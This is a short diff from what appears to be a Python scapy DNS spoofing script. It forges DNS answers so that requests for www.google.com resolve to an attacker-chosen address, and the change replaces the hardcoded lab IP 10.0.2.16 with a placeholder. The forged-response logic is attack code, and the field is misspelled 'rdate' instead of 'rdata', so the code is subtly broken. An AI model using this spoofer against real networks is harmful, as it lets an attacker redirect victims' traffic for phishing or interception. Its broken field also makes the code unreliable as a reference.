@@ -10,7 +10,7 @@ def process_packet(packet):
 		qname = scapy_packet[scapy.DNSRR].qname
 		if "www.google.com" in qname:
 			print("[+] Spoofing target")
-			answer = scapy.DNSRR(rrname=qname, rdate="10.0.2.16")
+			answer = scapy.DNSRR(rrname=qname, rdate="<IP>")
 			scapy_packet[scapy.DNS].an = answer
 			scapy_packet[scapy.DNS].ancount = 1
 
